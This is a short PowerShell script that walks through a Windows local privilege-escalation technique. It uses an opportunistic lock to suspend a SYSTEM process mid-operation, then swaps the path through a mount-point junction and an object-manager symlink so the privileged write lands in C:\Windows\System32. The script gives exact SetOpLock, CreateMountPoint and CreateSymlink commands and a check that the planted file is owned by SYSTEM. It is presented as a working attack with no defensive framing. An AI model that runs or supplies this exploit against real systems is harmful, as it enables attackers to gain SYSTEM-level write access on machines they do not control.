# oplock_race.ps1 — win a check-then-use / create-then-ACL window.
#
# The technique: take an opportunistic lock on the file the privileged process reads FIRST.
# The oplock suspends that process inside the operation, giving you unlimited time to swap the
# path (junction + object-manager symlink) before it continues.
#
# Requires: symboliclink-testing-tools (Forshaw) — SetOpLock.exe, CreateMountPoint.exe,
#           CreateSymlink.exe, BaitAndSwitch.exe
#
# Target: C:\ProgramData\Target

$target = "C:\ProgramData\Target"
$bait   = "$env:TEMP\wh_bait"
$dest   = "C:\Windows\System32\wh_proof.txt"     # where the privileged write should LAND

Write-Host "1. Confirm the privileged operation in Procmon first:"
Write-Host "     Operation is CreateFile / WriteFile, Result SUCCESS, Integrity System"
Write-Host "     Path is under a directory you can write"
Write-Host ""
Write-Host "2. Hold an oplock on the first-touched file:"
Write-Host "     SetOpLock.exe `"$target`" x"
Write-Host ""
Write-Host "3. With the process suspended, swap the directory for a junction:"
Write-Host "     CreateMountPoint.exe `"$(Split-Path $target)`" \RPC Control"
Write-Host "     CreateSymlink.exe `"\RPC Control\$(Split-Path $target -Leaf)`" `"\??\$dest`""
Write-Host ""
Write-Host "4. Release the oplock and let it continue. Then:"
Write-Host "     Get-Item `"$dest`" | Select-Object FullName, Length"
Write-Host "     (Get-Acl `"$dest`").Owner      # should be SYSTEM"
Write-Host ""
Write-Host "BaitAndSwitch.exe automates 2-4 for the common shapes."
